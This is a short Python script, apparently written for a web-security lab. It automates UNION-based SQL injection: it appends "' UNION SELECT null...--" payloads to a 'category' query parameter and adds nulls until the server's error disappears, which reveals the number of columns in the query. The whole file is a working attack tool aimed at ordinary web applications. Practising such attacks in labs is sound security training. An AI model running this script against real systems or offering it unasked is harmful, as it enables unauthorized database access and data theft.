import sys
import validators
import requests

class Exploit():
    def __init__(self) -> None:
        self.url = ''
        self.data = {}
        self.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        self.payload = ''
        self.column_num = 1
        self.check_params()
        self.set_url()
        self.is_successful = False
    
    def check_params(self) -> None:
        if len(sys.argv) < 2:
            print(f'[-] Usage: {sys.argv[0]} <URL>')
            print(f'[-] Example: http://example.com')
            exit()
    
    def set_url(self) -> None:
        url = sys.argv[1]
        if not validators.url(url):
            print(f'[-] The URL "{url}" is not valid.')
            print('[-] Example of a valid URL: http://example.com')
            exit()
        
        self.url = url
    
    def set_payload(self) -> None:
        nulls = ', '.join(('null '*self.column_num).split())
        self.payload = f"' UNION SELECT {nulls}--"
    
    def run(self) -> None:
        print('[+] Figuring out number of columns...')
        res = 'Internal Server Error'
        while 'Internal Server Error' in res:
            self.set_payload()
            self.data['category'] = 'Lifestyle' + self.payload
            req = requests.get(self.url, params=self.data)
            res = req.text
            self.column_num += 1
            if self.column_num == 50:
                return
        
        self.is_successful = True
        self.column_num -= 1
        print(f'[+] The number of columns is {self.column_num}')

def main() -> None:
    exploit = Exploit()
    exploit.run()

    if exploit.is_successful:
        print('[+] The exploit was successfull!')
    else:
        print('[-] The exploit was not successful!')

if __name__ == '__main__':
    main()